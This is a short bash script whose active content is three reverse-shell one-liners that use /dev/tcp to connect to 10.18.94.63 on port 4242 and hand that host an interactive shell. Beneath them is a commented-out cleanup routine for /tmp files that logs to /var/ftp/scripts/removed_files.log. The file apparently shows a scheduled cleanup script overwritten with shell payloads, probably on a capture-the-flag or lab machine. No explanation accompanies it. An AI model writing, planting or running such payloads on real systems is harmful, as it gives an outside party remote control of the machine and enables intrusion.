#!/bin/bash


bash -i >& /dev/tcp/10.18.94.63/4242 0>&1

0<&196;exec 196<>/dev/tcp/10.18.94.63/4242; sh <&196 >&196 2>&196

/bin/bash -l > /dev/tcp/10.18.94.63/4242 0<&1 2>&1

# tmp_files=0
# echo $tmp_files
# if [ $tmp_files=0 ]
# then
#         echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
# else
#     for LINE in $tmp_files; do
#         rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
# fi
